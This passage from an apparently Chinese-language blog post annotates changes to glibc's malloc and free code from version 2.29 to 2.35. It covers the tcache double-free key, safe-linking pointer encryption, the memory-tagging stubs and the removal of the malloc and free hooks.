class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本不会用到这个函数</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-2"><a href="#libc-malloc-2" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-2"><a href="#int-malloc-2" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-2"><a href="#libc-free-2" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-2"><a href="#int-free-2" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache-2"><a href="#tcache-2" class="headerlink" title="tcache"></a>tcache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在优先放入tcache时,会判断chunk的key字段是否为<u>tcache</u>,如果是:</p><p>则遍历<strong>该tcache链</strong>中的所有chunk,判断是否存在double free</p><h2 id="附属-2"><a href="#附属-2" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-3"><a href="#tcache-3" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache结构-1"><a href="#tcache结构-1" class="headerlink" title="tcache结构"></a>tcache结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>tcache_entry成员多了个key,用于验证double free</p><h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h4><p><code>e-&gt;key = tcache;</code></p><p>新增一句将key字段赋值为tcache</p><h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get"></a>tcache_get</h4><p><code>e-&gt;key = NULL;</code></p><p>新增一句将key字段置空</p><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p><strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)<span class="comment">//fd_nextsize为null那么其本身就不在nextsize链</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)<span class="comment">//fd为bin头的时候也不会进入,其实这种情况应该怎么也不会出现的,p在nextsize链上出现,p-&gt;fd任何情况也不会为null,****所以这部分代码的作用应该是防止修改bin头</span></span><br><span class="line"><span class="comment">//前提是确实不会有:在拥有相同大小chunk的情况下去分配nextsize链上的chunk的情况</span></span><br><span class="line">      &#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)<span class="comment">//nextsize链上只有p(其实整个链也只有p)</span></span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<span class="comment">//这样指向不会修改到bin头</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-3"><a href="#libc-malloc-3" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-3"><a href="#int-malloc-3" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="初始工作-1"><a href="#初始工作-1" class="headerlink" title="初始工作"></a>初始工作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))    \</span></span><br><span class="line"><span class="meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span></span><br><span class="line"><span class="meta">    &#123;    \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);    \</span></span><br><span class="line"><span class="meta">      return 0;    \</span></span><br><span class="line"><span class="meta">    &#125;    \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>宏checked_request2size现在由函数实现</p><h2 id="free-3"><a href="#free-3" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-3"><a href="#libc-free-3" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-3"><a href="#int-free-3" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-3"><a href="#附属-3" class="headerlink" title="附属"></a>附属</h2><p>无显著变化</p><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="malloc-4"><a href="#malloc-4" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-4"><a href="#libc-malloc-4" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-4"><a href="#int-malloc-4" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="fastbin-3"><a href="#fastbin-3" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp = REVEAL_PTR (victim-&gt;fd);</span><br></pre></td></tr></table></figure><p>新增取出时fastbin chunk解密</p><h2 id="free-4"><a href="#free-4" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-4"><a href="#libc-free-4" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-4"><a href="#int-free-4" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache-4"><a href="#tcache-4" class="headerlink" title="tcache"></a>tcache</h4><p>判断tcache double free时需要解密</p><h4 id="fastbin-4"><a href="#fastbin-4" class="headerlink" title="fastbin"></a>fastbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br></pre></td></tr></table></figure><p>放入fastbin时需加密</p><h2 id="附属-4"><a href="#附属-4" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-amp-amp-fastbin加密"><a href="#tcache-amp-amp-fastbin加密" class="headerlink" title="tcache&amp;&amp;fastbin加密"></a>tcache&amp;&amp;fastbin加密</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>tcache和fastbin新增链表加密</p><p>加密的具体方法是:<strong>取chunk的fd字段(next字段)的地址右移12位,再与要加密的数据异或</strong>,得到结果</p><p>解密则是与加密恰好相反</p><hr><p>并且可以发现:</p><p>对于一条fastbin或tcachebin单链表,从链表头看起,他的第一个chunk成员是不加密的,只有从第二个开始才会进行加密</p><h3 id="tcache-5"><a href="#tcache-5" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache-put-2"><a href="#tcache-put-2" class="headerlink" title="tcache_put"></a>tcache_put</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>放入tcache时加密</p><h4 id="tcache-get-2"><a href="#tcache-get-2" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br></pre></td></tr></table></figure><p>tcache取出时解密</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="malloc-5"><a href="#malloc-5" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-5"><a href="#libc-malloc-5" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-5"><a href="#int-malloc-5" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-5"><a href="#free-5" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-5"><a href="#libc-free-5" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-5"><a href="#int-free-5" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-5"><a href="#附属-5" class="headerlink" title="附属"></a>附属</h2><h3 id="M-TAG"><a href="#M-TAG" class="headerlink" title="M_TAG"></a>M_TAG</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_MTAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default implementaions when memory tagging is supported, but disabled.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">__default_tag_region (<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">__default_tag_nop (<span class="type">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __mtag_mmap_flags = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> __mtag_granule_mask = ~(<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_new_memset)(<span class="type">void</span> *, <span class="type">int</span>, <span class="type">size_t</span>) = <span class="built_in">memset</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_region)(<span class="type">void</span> *, <span class="type">size_t</span>) = __default_tag_region;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_new_usable)(<span class="type">void</span> *) = __default_tag_nop;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(*__tag_at)(<span class="type">void</span> *) = __default_tag_nop;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_MEMSET(ptr, val, size) __tag_new_memset (ptr, val, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_REGION(ptr, size) __tag_region (ptr, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_USABLE(ptr) __tag_new_usable (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_AT(ptr) __tag_at (ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_MEMSET(ptr, val, size) memset (ptr, val, size)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_REGION(ptr, size) (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_NEW_USABLE(ptr) (ptr)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TAG_AT(ptr) (ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>新增M_TAG部分,不过基本为空</p><h1 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h1><h2 id="malloc-6"><a href="#malloc-6" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-6"><a href="#libc-malloc-6" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">-    = atomic_forced_read (__malloc_hook);</span><br><span class="line">-  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">-    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>去除了__malloc_hook符号及调用,其实所有相关hook都被去除了</p><h3 id="int-malloc-6"><a href="#int-malloc-6" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-6"><a href="#free-6" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-6"><a href="#libc-free-6" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>去除了__free_hook符号及调用</p><h3 id="int-free-6"><a href="#int-free-6" class="headerlink" title="__int_free"></a>__int_free</h3><p>无显著变化</p><h2 id="附属-6"><a href="#附属-6" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-6"><a href="#tcache-6" class="headerlink" title="tcache"></a>tcache</h3><h4 id="key验证"><a href="#key验证" class="headerlink" title="key验证"></a>key验证</h4><p>以往key_entry结构体中用于验证double free的key字段是用tcache填充,现在改为用tcache_key填充</p><p>tcache_key的产生如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="M-TAG-1"><a href="#M-TAG-1" class="headerlink" title="M_TAG"></a>M_TAG</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_MTAG</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> mtag_enabled = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> mtag_mmap_flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_enabled false</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> mtag_mmap_flags 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_region (ptr, size);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_zero_region</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_tag_zero_region (__libc_mtag_new_tag (ptr), size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span> (ptr, <span class="number">0</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Defined later.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_new_usable</span> <span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tag_at</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    <span class="keyword">return</span> __libc_mtag_address_get_tag (ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>M_TAG实装了一部分,但依然没什么用</p><h1 id="glibc2-35"><a href="#glibc2-35" class="headerlink" title="glibc2.35"></a>glibc2.35</h1><h2 